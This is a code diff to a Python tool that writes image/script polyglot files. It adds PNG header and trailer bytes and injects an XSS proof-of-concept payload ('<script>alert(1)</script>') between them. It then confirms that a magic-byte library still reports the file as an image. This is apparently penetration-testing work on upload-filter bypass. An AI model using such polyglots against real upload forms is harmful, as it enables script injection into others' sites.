@@ -6,7 +6,7 @@ from PIL import Image, ImageDraw
 
 class Headers:
     def __init__(self):
-        self.header = ''
+        pass
 
     def gif_header_data(self):
         # GIF Header (13 bytes)
@@ -28,7 +28,7 @@ class Headers:
 
         return header
 
-    def bmp_header_data(self, header):
+    def bmp_header_data(self):
         # BMP Header (14 bytes)
         header  = b'\x42\x4d'          # Magic bytes header       (`BM`)
         header += b'\x1e\x00\x00\x00'  # BMP file size            (30 bytes)
@@ -49,6 +49,17 @@ class Headers:
 
         return header
 
+    def png_header_data(self):
+        # PNG header 
+        header = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'    # PNG signature
+        header += b'\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90\x77\x53\xde'   # Image header
+        header += b'\x00\x00\x00\x0c\x49\x44\x41\x54\x08\xd7\x63\xf8\xcf\xc0\x00\x00\x03\x01\x01\x00\x18\xdd\x8d\xb0'   # Image data
+
+        return header
+
+    def png_end(self):
+        header = b'\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82'   # Image end
+        return header
 
 def hex_viewer(filename, is_binary=False):
     try:
@@ -88,24 +99,27 @@ def create_gif(width, height):
 
     images[0].save(os.path.join(BASE_DIR, 'name.gif'), save_all=True)
 
-def inject(payload, contents, out_file):
+def inject(payload, contents, contents_end, out_file):
     f = open(out_file, "w+b")
     f.write(contents)
     f.write(b'\x2f\x2f\x2f\x2f\x2f')
     f.write(payload)
     f.write(b'\x3b')
+    f.write(contents_end)
     f.close()
 
 if __name__ == '__main__':
-    final_filename = 'output.gif'
+    # final_filename = 'output.gif'
+    final_filename = 'cysuite.png'
     payload = '<script>alert(1)</script>'.encode()
     create_gif(200, 150)
-    gif_header = Headers().gif_header_data()
-    inject(payload, gif_header, final_filename)
+    png_header = Headers().png_header_data()
+    png_end = Headers().png_end()
+    inject(payload, png_header, png_end, final_filename)
     hex_viewer(final_filename)
 
     print("Image details")
     print("Name: ", puremagic.magic_file(final_filename)[0].name)
     print("Extension: ", puremagic.magic_file(final_filename)[0].extension)
     print("Mime type: ", puremagic.magic_file(final_filename)[0].mime_type)
-    print("Byte match: ", puremagic.magic_file(final_filename)[0].byte_match.decode('utf-8'))
+    print("Byte match: ", puremagic.magic_file(final_filename)[0].byte_match.decode('UTF-8','ignore'))
